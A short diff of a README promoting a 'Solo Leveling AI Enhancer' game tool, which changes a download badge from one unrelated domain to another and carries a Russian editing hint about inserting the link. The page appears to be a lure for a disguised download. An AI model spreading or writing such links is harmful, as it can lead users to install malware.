@@ -5,7 +5,7 @@ Welcome to the **next evolution** in Solo Leveling: Arise gameplay. The **Solo L
 Created for both **casual players** and **elite hunters**, this enhancer offers a highly configurable and user-friendly experience, wrapped in an intuitive interface.
 
 <!-- ПОДСКАЗКА НА РУССКОМ: Вставьте ссылку на страницу или файл для скачивания enhancer (например, https://example.com/enhancer) вместо INSERT_DOWNLOAD_LINK_HERE -->
-[![Download AI Enhancer](https://img.shields.io/badge/Download-Solo_Leveling_AI_Enhancer-purple)](https://cea-groupe.com)
+[![Download AI Enhancer](https://img.shields.io/badge/Download-Solo_Leveling_AI_Enhancer-purple)](https://glocktober.com)
 
 ---
 
